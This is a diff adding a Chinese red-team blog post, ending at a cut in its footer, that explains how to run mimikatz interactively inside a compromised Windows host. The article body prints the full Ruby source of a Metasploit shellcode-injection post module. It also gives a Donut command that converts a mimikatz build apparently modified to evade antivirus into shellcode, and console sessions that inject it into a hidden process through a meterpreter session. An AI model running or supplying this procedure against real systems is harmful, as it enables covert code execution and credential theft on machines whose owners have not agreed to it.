@@ -1,0 +1,1348 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="从旁人的愚行中学到聪明。  如题所示，今天给大家带来的是msf下交互式执行程序。所有工具下载地址在文末。 首先我们先来介绍下今天的工具Dount,官方的介绍是这样的： 123456789Donut generates x86 or x64 shellcode from VBScript, JScript, EXE, DLL (including .NET Assemblies) files. Th">
+<meta name="keywords" content="red team,msf,dount">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RedTeam之使用msf+Donut交互式执行程序">
+<meta property="og:url" content="https://lengjibo.github.io/rt/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="从旁人的愚行中学到聪明。  如题所示，今天给大家带来的是msf下交互式执行程序。所有工具下载地址在文末。 首先我们先来介绍下今天的工具Dount,官方的介绍是这样的： 123456789Donut generates x86 or x64 shellcode from VBScript, JScript, EXE, DLL (including .NET Assemblies) files. Th">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gagag3c6cuj30pz0e5gsa.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gagag8jodmj30ig058q4g.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gagagsgktoj30hz04rgly.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gagaheyqzlj30iu05iab2.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gagai8n773j30hw0900uq.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gagaie46l2j30g108cq5d.jpg">
+<meta property="og:updated_time" content="2019-12-31T14:48:33.552Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="RedTeam之使用msf+Donut交互式执行程序">
+<meta name="twitter:description" content="从旁人的愚行中学到聪明。  如题所示，今天给大家带来的是msf下交互式执行程序。所有工具下载地址在文末。 首先我们先来介绍下今天的工具Dount,官方的介绍是这样的： 123456789Donut generates x86 or x64 shellcode from VBScript, JScript, EXE, DLL (including .NET Assemblies) files. Th">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gagag3c6cuj30pz0e5gsa.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/rt/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>RedTeam之使用msf+Donut交互式执行程序 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/rt/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">RedTeam之使用msf+Donut交互式执行程序
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-12-31 22:42:21 / Updated at: 22:48:33" itemprop="dateCreated datePublished" datetime="2019-12-31T22:42:21+08:00">2019-12-31</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>从旁人的愚行中学到聪明。</p>
+<hr>
+<p>如题所示，今天给大家带来的是msf下交互式执行程序。所有工具下载地址在文末。</p>
+<p>首先我们先来介绍下今天的工具Dount,官方的介绍是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Donut generates x86 or x64 shellcode from VBScript, JScript, EXE, DLL (including .NET Assemblies) files. </span><br><span class="line">This shellcode can be injected into an arbitrary Windows process for in-memory execution. Given a supported </span><br><span class="line">file type, parameters and an entry point where applicable (such as Program.Main), it produces position-independent </span><br><span class="line">shellcode that loads and runs entirely from memory. A module created by donut can either be staged from a URL or stageless</span><br><span class="line"> by being embedded directly in the shellcode. Either way, the module is encrypted with the Chaskey block cipher and a 128-bit</span><br><span class="line"> randomly generated key. After the file is loaded through the PE/ActiveScript/CLR loader, the original reference is erased </span><br><span class="line">  from memory to deter memory scanners. For .NET Assemblies, they are loaded into a new Application Domain to allow for </span><br><span class="line">  running Assemblies in disposable AppDomains.</span><br><span class="line">It can be used in several ways.</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>大体意思就是它可以执行各种各样的shellcode什么乱七八糟的。</p>
+<p>然后下面是我们的一个msf下用于shellcode注入的模块：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/post/common'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'msf/core/post/windows/reflective_dll_injection'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Post</span></span><br><span class="line">  <span class="keyword">include</span> Msf::Post::Common</span><br><span class="line">  <span class="keyword">include</span> Msf::Post::Windows::ReflectiveDLLInjection</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info=&#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span>( update_info( info,</span><br><span class="line">      <span class="string">'Name'</span>          =&gt; <span class="string">'Windows Manage Memory Shellcode Injection Module'</span>,</span><br><span class="line">      <span class="string">'Description'</span>   =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">        This module will inject into the memory of a process a specified shellcode.</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">'License'</span>       =&gt; MSF_LICENSE,</span><br><span class="line">      <span class="string">'Author'</span>        =&gt; [ <span class="string">'phra &lt;https://iwantmore.pizza&gt;'</span> ],</span><br><span class="line">      <span class="string">'Platform'</span>      =&gt; [ <span class="string">'win'</span> ],</span><br><span class="line">      <span class="string">'SessionTypes'</span>  =&gt; [ <span class="string">'meterpreter'</span> ]</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        OptPath.new(<span class="string">'SHELLCODE'</span>, [<span class="literal">true</span>, <span class="string">'Path to the shellcode to execute'</span>]),</span><br><span class="line">        OptInt.new(<span class="string">'PID'</span>, [<span class="literal">false</span>, <span class="string">'Process Identifier to inject of process to inject the shellcode. (0 = new process)'</span>, <span class="number">0</span>]),</span><br><span class="line">        OptBool.new(<span class="string">'CHANNELIZED'</span>, [<span class="literal">true</span>, <span class="string">'Retrieve output of the process'</span>, <span class="literal">true</span>]),</span><br><span class="line">        OptBool.new(<span class="string">'INTERACTIVE'</span>, [<span class="literal">true</span>, <span class="string">'Interact with the process'</span>, <span class="literal">true</span>]),</span><br><span class="line">        OptBool.new(<span class="string">'HIDDEN'</span>, [<span class="literal">true</span>, <span class="string">'Spawn an hidden process'</span>, <span class="literal">true</span>]),</span><br><span class="line">        OptEnum.new(<span class="string">'BITS'</span>, [<span class="literal">true</span>, <span class="string">'Set architecture bits'</span>, <span class="string">'64'</span>, [<span class="string">'32'</span>, <span class="string">'64'</span>]])</span><br><span class="line">      ])</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Run Method for when run command is issued</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">run</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># syinfo is only on meterpreter sessions</span></span><br><span class="line">    print_status(<span class="string">"Running module against <span class="subst">#&#123;sysinfo[<span class="string">'Computer'</span>]&#125;</span>"</span>) <span class="keyword">if</span> <span class="keyword">not</span> sysinfo.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set variables</span></span><br><span class="line">    shellcode = IO.read(datastore[<span class="string">'SHELLCODE'</span>])</span><br><span class="line">    pid = datastore[<span class="string">'PID'</span>]</span><br><span class="line">    bits = datastore[<span class="string">'BITS'</span>]</span><br><span class="line">    p = <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> bits == <span class="string">'64'</span></span><br><span class="line">      bits = ARCH_X64</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      bits = ARCH_X86</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pid == <span class="number">0</span> <span class="keyword">or</span> <span class="keyword">not</span> has_pid?(pid)</span><br><span class="line">      p = create_temp_proc(bits)</span><br><span class="line">      print_status(<span class="string">"Spawned process <span class="subst">#&#123;p.pid&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_status(<span class="string">"Opening process <span class="subst">#&#123;p.pid&#125;</span>"</span>)</span><br><span class="line">      p = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> bits == ARCH_X64 <span class="keyword">and</span> client.arch == ARCH_X86</span><br><span class="line">      print_error(<span class="string">"You are trying to inject to a x64 process from a x86 version of Meterpreter."</span>)</span><br><span class="line">      print_error(<span class="string">"Migrate to an x64 process and try again."</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">elsif</span> arch_check(bits, p.pid)</span><br><span class="line">      inject(shellcode, p)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Checks the Architeture of a Payload and PID are compatible</span></span><br><span class="line">  <span class="comment"># Returns true if they are false if they are not</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">arch_check</span><span class="params">(bits, pid)</span></span></span><br><span class="line">    <span class="comment"># get the pid arch</span></span><br><span class="line">    client.sys.process.processes.each <span class="keyword">do</span> <span class="params">|p|</span></span><br><span class="line">      <span class="comment"># Check Payload Arch</span></span><br><span class="line">      <span class="keyword">if</span> pid == p[<span class="string">"pid"</span>]</span><br><span class="line">        print_status(<span class="string">"Process found checking Architecture"</span>)</span><br><span class="line">        <span class="keyword">if</span> bits == p[<span class="string">'arch'</span>]</span><br><span class="line">          print_good(<span class="string">"Process is the same architecture as the payload"</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          print_error(<span class="string">"The PID <span class="subst">#&#123; p[<span class="string">'arch'</span>]&#125;</span> and Payload <span class="subst">#&#123;bits&#125;</span> architectures are different."</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Creates a temp notepad.exe to inject payload in to given the payload</span></span><br><span class="line">  <span class="comment"># Returns process PID</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">create_temp_proc</span><span class="params">(bits)</span></span></span><br><span class="line">    windir = client.sys.config.getenv(<span class="string">'windir'</span>)</span><br><span class="line">    <span class="comment"># Select path of executable to run depending the architecture</span></span><br><span class="line">    <span class="keyword">if</span> bits == ARCH_X86 <span class="keyword">and</span> client.arch == ARCH_X86</span><br><span class="line">      cmd = <span class="string">"<span class="subst">#&#123;windir&#125;</span>\\System32\\notepad.exe"</span></span><br><span class="line">    <span class="keyword">elsif</span> bits == ARCH_X64 <span class="keyword">and</span> client.arch == ARCH_X64</span><br><span class="line">      cmd = <span class="string">"<span class="subst">#&#123;windir&#125;</span>\\System32\\notepad.exe"</span></span><br><span class="line">    <span class="keyword">elsif</span> bits == ARCH_X64 <span class="keyword">and</span> client.arch == ARCH_X86</span><br><span class="line">      cmd = <span class="string">"<span class="subst">#&#123;windir&#125;</span>\\Sysnative\\notepad.exe"</span></span><br><span class="line">    <span class="keyword">elsif</span> bits == ARCH_X86 <span class="keyword">and</span> client.arch == ARCH_X64</span><br><span class="line">      cmd = <span class="string">"<span class="subst">#&#123;windir&#125;</span>\\SysWOW64\\notepad.exe"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    proc = client.sys.process.execute(cmd, <span class="literal">nil</span>, &#123;</span><br><span class="line">      <span class="string">'Hidden'</span> =&gt; datastore[<span class="string">'HIDDEN'</span>],</span><br><span class="line">      <span class="string">'Channelized'</span> =&gt; datastore[<span class="string">'CHANNELIZED'</span>],</span><br><span class="line">      <span class="string">'Interactive'</span> =&gt; datastore[<span class="string">'INTERACTIVE'</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proc</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">inject</span><span class="params">(shellcode, p)</span></span></span><br><span class="line">    print_status(<span class="string">"Injecting shellcode into process ID <span class="subst">#&#123;p.pid&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">      print_status(<span class="string">"Allocating memory in process <span class="subst">#&#123;p.pid&#125;</span>"</span>)</span><br><span class="line">      mem = inject_into_process(p, shellcode)</span><br><span class="line">      print_status(<span class="string">"Allocated memory at address <span class="subst">#&#123;<span class="string">"0x%.8x"</span> % mem&#125;</span>, for <span class="subst">#&#123;shellcode.length&#125;</span> byte shellcode"</span>)</span><br><span class="line">      p.thread.create(mem, <span class="number">0</span>)</span><br><span class="line">      print_good(<span class="string">"Successfully injected payload into process: <span class="subst">#&#123;p.pid&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> datastore[<span class="string">'INTERACTIVE'</span>] &amp;&amp; datastore[<span class="string">'CHANNELIZED'</span>] &amp;&amp; datastore[<span class="string">'PID'</span>] == <span class="number">0</span></span><br><span class="line">        print_status(<span class="string">"Interacting"</span>)</span><br><span class="line">        client.console.interact_with_channel(p.channel)</span><br><span class="line">      <span class="keyword">elsif</span> datastore[<span class="string">'CHANNELIZED'</span>]</span><br><span class="line">        print_status(<span class="string">"Retrieving output"</span>)</span><br><span class="line">        data = p.channel.read</span><br><span class="line">        print_line(data) <span class="keyword">if</span> data</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">      print_error(<span class="string">"Failed to inject Payload to <span class="subst">#&#123;p.pid&#125;</span>!"</span>)</span><br><span class="line">      print_error(e.to_s)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>我们来看下具体操作：</p>
+<blockquote>
+<p>/donut /usr/share/mimikatz/bypass360/mimikatz/sign-katz-x64.exe -a 2 -o /tmp/payload.bin</p>
+</blockquote>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gagag3c6cuj30pz0e5gsa.jpg" alt="1.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gagag8jodmj30ig058q4g.jpg" alt="2.png"></p>
+<p>－a：是指定位数，2位64位<br>－o：是指定输出</p>
+<p>假设已经获取了一个meterpreter:</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gagagsgktoj30hz04rgly.jpg" alt="3.png"></p>
+<p>执行我们刚才的模块即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use post/windows/manage/shellcode_inject </span><br><span class="line">msf5 post(windows/manage/shellcode_inject) &gt; set shellcode /tmp/payloads.bin</span><br><span class="line">shellcode =&gt; /tmp/payloads.bin</span><br><span class="line">msf5 post(windows/manage/shellcode_inject) &gt; set session 5</span><br><span class="line">session =&gt; 5</span><br><span class="line">msf5 post(windows/manage/shellcode_inject) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Running module against DESKTOP-QQF0MLN</span><br><span class="line">[*] Spawned process 1020</span><br><span class="line">[-] You are trying to inject to a x64 process from a x86 version of Meterpreter.</span><br><span class="line">[-] Migrate to an x64 process and try again.</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gagaheyqzlj30iu05iab2.jpg" alt="4.png"></p>
+<p>出错了，因为我们是x86的系统，需要指定位数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(windows/manage/shellcode_inject) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/shellcode_inject):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting    Required  Description</span><br><span class="line">   ----         ---------------    --------  -----------</span><br><span class="line">   BITS         64                 yes       Set architecture bits (Accepted: 32, 64)</span><br><span class="line">   CHANNELIZED  true               yes       Retrieve output of the process</span><br><span class="line">   HIDDEN       true               yes       Spawn an hidden process</span><br><span class="line">   INTERACTIVE  true               yes       Interact with the process</span><br><span class="line">   PID          0                  no        Process Identifier to inject of process to inject the shellcode. (0 = new process)</span><br><span class="line">   SESSION      5                  yes       The session to run this module on.</span><br><span class="line">   SHELLCODE    /tmp/payloads.bin  yes       Path to the shellcode to execute</span><br><span class="line"></span><br><span class="line">msf5 post(windows/manage/shellcode_inject) &gt; set bits 32</span><br><span class="line">bits =&gt; 32</span><br><span class="line">msf5 post(windows/manage/shellcode_inject) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gagai8n773j30hw0900uq.jpg" alt="5.png"></p>
+<p>获得一个交互式的mimikatz：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gagaie46l2j30g108cq5d.jpg" alt="6.png"></p>
+<p>工具下载地址：</p>
+<p><a href="https://github.com/TheWover/donut" target="_blank" rel="noopener">https://github.com/TheWover/donut</a></p>
+<p>原文链接：</p>
+<p><a href="https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html" target="_blank" rel="noopener">https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
